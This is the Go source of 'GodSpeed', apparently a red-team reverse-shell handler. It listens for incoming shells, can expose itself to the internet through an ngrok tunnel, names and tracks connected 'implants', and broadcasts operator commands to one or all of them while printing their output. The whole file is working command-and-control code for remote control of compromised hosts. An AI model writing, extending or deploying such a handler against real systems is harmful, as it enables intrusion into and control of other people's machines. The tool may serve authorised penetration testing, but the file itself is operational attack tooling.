package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
	"io/ioutil"
	"net/http"


	"github.com/akamensky/argparse"
	"github.com/savaki/jq"
	"github.com/olekukonko/tablewriter"
	"github.com/atotto/clipboard"
	"github.com/c-bata/go-prompt"
	"github.com/common-nighthawk/go-figure"
	"github.com/fatih/color"
	. "github.com/redcode-labs/Coldfire"
	"github.com/taion809/haikunator"
)

var red = color.New(color.FgRed).SprintFunc()
var green = color.New(color.FgGreen).SprintFunc()
var cyan = color.New(color.FgCyan).SprintFunc()
var bold = color.New(color.Bold).SprintFunc()
var yellow = color.New(color.FgYellow).SprintFunc()
var magenta = color.New(color.FgMagenta).SprintFunc()

var implants []*Implant
var active_ids []int
var base_id = 0

type Implant struct {
	name string
	id   int
	time string
	ip   string
	conn net.Conn
}

func f(s string, arg ...interface{}) string {
	return fmt.Sprintf(s, arg...)
}

func p() {
	fmt.Println("")
}

func PrintBanner() {
	banner := figure.NewFigure("GodSpeed", "weird", true)
	color.Set(color.FgMagenta)
	p()
	banner.Print()
	p()
	color.Unset()
	fmt.Println("\t\tCreated by: redcodelabs.io", red(bold("<*>")))
}

func Haikunate() string {
	h := haikunator.NewHaikunator()
	return h.DelimHaikunate(".")
}

func StartReceiver(implant *Implant) {
	defer implant.conn.Close()
	buf := make([]byte, 100024)
	for {
		n, _ := implant.conn.Read(buf)
		//do smthing with err? ^
		rcv := string(buf[:n])
		dt := time.Now()
		cur_time := dt.Format("15:04")
		if len(rcv) > 1 && !strings.Contains(rcv, "$") && !strings.Contains(rcv, "xxxyyy") {
			fmt.Println(f("\n - - - - - - - - - - [%s] (%s :: %s) ", bold(cur_time), bold(cyan(implant.id)), magenta(implant.name)))
			p()
			fmt.Println(rcv)
		}
		//data_type := strings.Split(rcv, ":")[0]
		//data := strings.Join(strings.Split(rcv, ":")[1:], ":")
	}
}

func completer_cmd_loop(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "exit", Description: "Exit program"},
		//{Text: "log", Description: "Enable/disable logging of command's output to a file"},
		{Text: "list", Description: "Show information about connected implants"},
		{Text: "interact", Description: "Interact with one or more implants"},
		//{Text: "kill", Description: "Kill connection with implants"},
		{Text: "check", Description: "Check all shells' connectivity"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}

func update_prompt_prefix() (string, bool) {
	if len(active_ids) == 0 {
		return "Gs - ", true
	} else {
		return fmt.Sprintf("Gs (%s) - ", strconv.Itoa(len(active_ids))), true
	}
}

func SendData(data string) {
	for _, implant := range implants {
		if Contains(active_ids, implant.id) {
			_, err := io.WriteString(implant.conn, data+"\n")
			if err != nil {
				p()
				PrintError(f("Unable to send data to ID:%d: %s", implant.id, red(err.Error())))
				p()
			}
		}
	}
}

func SendDataConn(conn net.Conn, message string) error {
	_, err := io.WriteString(conn, message+"\n")
	if err != nil {
		return err
	}
	return nil
}

func RemoveImplant(ssSlice []*Implant, ss *Implant) []*Implant {
	for idx, v := range ssSlice {
		if v == ss {
			return append(ssSlice[0:idx], ssSlice[idx+1:]...)
		}
	}
	return ssSlice
}

func StartCommandPrompt() {
	for {
		//prm := fmt.Sprintf("oyabun[%s]  ", strings.Split(conn.RemoteAddr().String(), ":")[0])
		prm := " "
		cmd := prompt.Input(prm, completer_cmd_loop,
			//prompt.OptionTitle("sql-prompt"),
			//prompt.OptionHistory([]string{"SELECT * FROM users;"}),
			prompt.OptionPrefixTextColor(prompt.White),
			prompt.OptionLivePrefix(update_prompt_prefix),
			//prompt.OptionDescriptionTextColor(prompt.White),
			prompt.OptionPreviewSuggestionTextColor(prompt.White),
			prompt.OptionPreviewSuggestionBGColor(prompt.Black),
			prompt.OptionInputTextColor(prompt.Purple),
			prompt.OptionSelectedDescriptionBGColor(prompt.Black),
			prompt.OptionDescriptionTextColor(prompt.White),
			prompt.OptionSelectedDescriptionTextColor(prompt.Purple),
			prompt.OptionDescriptionBGColor(prompt.Black),
			prompt.OptionSelectedSuggestionTextColor(prompt.Purple),
			prompt.OptionSelectedSuggestionBGColor(prompt.Black),
			prompt.OptionScrollbarBGColor(prompt.Black),
			prompt.OptionScrollbarThumbColor(prompt.Purple),
			prompt.OptionMaxSuggestion(22),
			//prompt.OptionShowCompletionAtStart(),
			prompt.OptionCompletionOnDown(),
			prompt.OptionSuggestionBGColor(prompt.Black),
			prompt.OptionSuggestionTextColor(prompt.Blue))
		elements := strings.Split(cmd, " ")
		l := len(elements)
		switch elements[0] {
		case "interact":
			word := ""
			remove := false
			interact_all := false
			if ContainsAny("*", elements) {
				interact_all = true
			}
			if ContainsAny("-r", elements) {
				remove = true
			}
			if l == 1 {
				p()
				fmt.Println(`Usage: interact [-r] <ids>...
                             Pass '*' as argument to interact with all implants
                             When '-r' is used, implant is removed from active list
                             Passed IDs should be separated with a single space`)
				p()
			} else {
				ids := elements[1:]
				ids = RemoveStr(ids, "*")
				ids = RemoveStr(ids, "-r")
				if remove {
					word = f("%d", len(ids))
					if interact_all {
						word = "all"
					}
					for _, id := range ids {
						i := StrToInt(id)
						active_ids = RemoveInt(active_ids, i)
					}
					if interact_all {
						active_ids = []int{}
					}
					p()
					PrintInfo(f("Removed %s implants from active pool", red(word)))
					p()
				} else {
					active_ids = []int{}
					word = f("%d", len(ids))
					if interact_all {
						word = "all"
						for i := 0; i < len(implants); i++ {
							active_ids = append(active_ids, i)
						}
						ids = []string{}
					}
					for _, id := range ids {
						i := StrToInt(id)
						active_ids = append(active_ids, i)
					}
					p()
					PrintInfo(f("Added %s agents to active pool", green(word)))
					p()
				}
				active_ids = RemoveDuplicatesInt(active_ids)
			}
		case "list":
			parser := argparse.NewParser("list", "Show available implants") //, usage_prologue)
			var vertical *bool = parser.Flag("v", "vertical", &argparse.Options{Help: "If implant does not respond, remove it permanently"})
			err := parser.Parse(elements)
			if err != nil {
				p()
				PrintError(parser.Usage(err))
				p()
			} else if ! ContainsAny(cmd, []string{"-h"}) {
				if len(implants) != 0 {
					p()
					PrintInfo(bold(green(len(implants))) + " implants connected")
					p()
					sep := "=================================================="
					if *vertical {
						fmt.Println(sep)
					}
					table := tablewriter.NewWriter(os.Stdout)
					table.SetHeader([]string{"ID", "STATUS", "NAME", "TIME", "IP"})
					table.SetCenterSeparator("|")
					table.SetRowSeparator("-")
					table.SetAlignment(tablewriter.ALIGN_CENTER)
					for _, implant := range implants {
						status := red(bold("(x)"))
						if Contains(active_ids, implant.id) {
							status = green(bold("(+)"))
						}
						if implant.id != -1 {
							if *vertical {
								fmt.Println("ID     -> " + cyan(IntToStr(implant.id)))
								fmt.Println("NAME   -> " + red(implant.name))
								fmt.Println("STATUS -> " + status)
								fmt.Println("TIME   -> " + implant.time)
								fmt.Println("IP     -> " + implant.ip)
								fmt.Println(sep)
							} else {
								data := [][]string{[]string{cyan(implant.id), status, magenta(implant.name), implant.time, implant.ip}}
								for v := range data {
									table.Append(data[v])
								}
							}
						}
					}
					table.Render()
					p()
				} else {
					p()
					PrintError("No implants connected")
					p()
				}
			}
		case "exit":
			PrintInfo("Exiting...")
			CmdBlind("pkill -9 ngrok")
			os.Exit(0)
		case "check":
			parser := argparse.NewParser("check", "Check connectivity of active hosts") //, usage_prologue)
			parser.ExitOnHelp(false)
			var remove *bool = parser.Flag("r", "remove", &argparse.Options{Help: "If implant does not respond, remove it permanently"})
			var num *int = parser.Int("n", "num", &argparse.Options{Default: 2, Help: "Number of times to send data to the implant to check socket"})
			err := parser.Parse(elements)
			if err != nil {
				p()
				PrintError(err.Error())
				p()
			} else if !ContainsAny(cmd, []string{"-h"}) {
				header := []string{"--ID--", "--NAME--", "--STATUS--"}
				data := [][]string{}
				num_errors := 0
				if len(implants) != 0 {
					for _, implant := range implants {
						status := ""
						for i := 0; i < *num; i++{
							err := SendDataConn(implant.conn, "echo aa > /dev/null")
							if err != nil{
								num_errors += 1
							}
						} 
						if num_errors != 0 {
						//	print_info(f("Implant #%d (%s) is %s", implant.id, magenta(implant.name), red("UNREACHABLE")))
							status = red("UNREACHABLE")
							SendDataConn(implant.conn, "exit:")
							if *remove {
								active_ids = RemoveInt(active_ids, implant.id)
								implants = RemoveImplant(implants, implant)
							}
						} else {
							status = green("CONNECTED")
							//print_info(f("Implant #%d (%s) is %s", implant.id, magenta(implant.name), green("CONNECTED")))
						}
						data = append(data, []string{cyan(implant.id), 
													magenta(implant.name), 
													status})
					}
					table := tablewriter.NewWriter(os.Stdout)
					table.SetHeader(header)
					table.SetCenterSeparator("*")
					table.SetRowSeparator("-")
					table.SetAlignment(tablewriter.ALIGN_CENTER)
					for v := range data {
						table.Append(data[v])
					}
					p()
					PrintInfo(f("Checking connectivity of %d implants...", len(implants)))
					table.Render()
					p()
				} else {
					p()
					PrintError("No implants connected")
					p()
				}
			}
		default:
			SendData(cmd)
		}
	}
}

func StartTunnel(port string) (string, string) {
	//regions := []string{"us", "eu", "ap", "au", "sa", "jp", "in"}
	//selected_region := RandomSelectStr(regions)
	go CmdBlind("ngrok tcp "+port)
	time.Sleep(2 * time.Second)
	local_url := "http://localhost:4040/api/tunnels"
	resp, err := http.Get(local_url)
	if err != nil {
		PrintError("Cannot obtain tunnel's address -> "+err.Error())
		os.Exit(0)
	}
	defer resp.Body.Close()
	json, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		PrintError("Cannot obtain tunnel's address -> "+err.Error())
		os.Exit(0)
	}
	jq_op_1, _ := jq.Parse(".tunnels")
	json_1, _ := jq_op_1.Apply(json)
	jq_op_2, _ := jq.Parse(".[0]")
	json_2, _ := jq_op_2.Apply(json_1)
	jq_op_3, _ := jq.Parse(".public_url")
	json_3, _ := jq_op_3.Apply(json_2)
	main_url := strings.Replace(string(json_3), `"`, "", -1)
	main_url = strings.Replace(main_url, `tcp://`, "", -1)
	tunnel_addr := strings.Split(main_url, ":")[0]
	tunnel_port := strings.Split(main_url, ":")[1]
	t_ip, err := DnsLookup(tunnel_addr)
	tunnel_ip := t_ip[0]
	if err != nil {
		PrintError(F("Cannot perform DNS lookup for %s: %s", Red(tunnel_ip), err.Error()))
	}
	return tunnel_ip, tunnel_port
}

func StartServer(proto, port string) {
	go StartCommandPrompt()
	listener, _ := net.Listen(proto, "0.0.0.0:"+port)
	for {
		connection, err := listener.Accept()
		fmt.Println("")
		ExitOnError(err)
		//fmt.Println("[*] Connection from: ", green(bold(conn.RemoteAddr())))
		n := Haikunate()
		dt := time.Now()
		t := dt.Format("15:04")
		addr := strings.Split(connection.RemoteAddr().String(), ":")[0]
		p()
		PrintGood(fmt.Sprintf("Received connection from: %s (%s)", green(bold(addr)), magenta(n)))
		p()
		implant := &Implant{
			conn: connection,
			name: n,
			id:   base_id,
			time: t,
			ip:   addr,
		}
		implants = append(implants, implant)
		if len(active_ids) == 0 {
			active_ids = append(active_ids, base_id)
		}
		//defer conn.Close()
		//go handle_tls_conn(conn)
		go StartReceiver(implant)
		base_id += 1
	}
}

func main() {
	//parser := argparse.NewParser("GodSpeed", "")
	PrintBanner()
	parser := argparse.NewParser("godspeed", "")
	var port *string = parser.String("p", "port", &argparse.Options{Default: "4444", Help: "Local port to listen on"})
	var clip *bool = parser.Flag("c", "clip", &argparse.Options{Required: false, Help: "Copy listening C2 address to clipboard"})
	var tunnel *bool = parser.Flag("t", "tunnel", &argparse.Options{Required: false, Help: "Expose C2 server using Ngrok tunnel"})
	err := parser.Parse(os.Args)
	ExitOnError(err)
	c2_addr := GetLocalIp() + ":" + *port
	if *tunnel{
		t_addr, t_port := StartTunnel(*port)
		c2_addr = t_addr + ":" + t_port
		PrintInfo("Started tunnel")
	}
	p()
	PrintInfo(F("Started reverse handler %s", cyan(bold("["+c2_addr+"]"))))
	p()
	if *clip {
		clipboard.WriteAll(c2_addr)
		PrintInfo("Copied server address to clipboard")
		p()
	}
	StartServer("tcp", *port)
}
